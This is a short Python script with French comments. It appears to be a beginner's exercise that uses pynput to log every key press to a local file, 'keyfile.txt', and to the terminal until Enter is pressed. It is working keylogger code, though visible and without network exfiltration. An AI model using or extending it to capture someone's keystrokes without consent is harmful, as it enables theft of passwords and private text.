from pynput import keyboard                                 # Librairie permettant de controller/monitorer les inputs de la souris et du clavier

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:                # Permet d'ouvrir et de fermer le fichier
        try:
            char = key.char                                 # Accéder à l'attribut char de l'objet key
            logKey.write(char)                              # Write char in keyfile.txt
        except:
            print("Error getting char")

if __name__ == "__main__":
    print("Start of the program")
    file = open("keyfile.txt",'w')                          # Permet de réinistialliser keyfile.txt à chaque exécution 
    file.close()
    listener = keyboard.Listener(on_press=keyPressed)       # La fonction keyPressed est appelée à chaque fois qu'une touche est appuyée (on_press)
    listener.start()
    input()                                                 # Permet au script de run, pour que l'on puisse écouter jusqu'à ce que l'on appuisse sur 'Enter' directement dans le Terminal



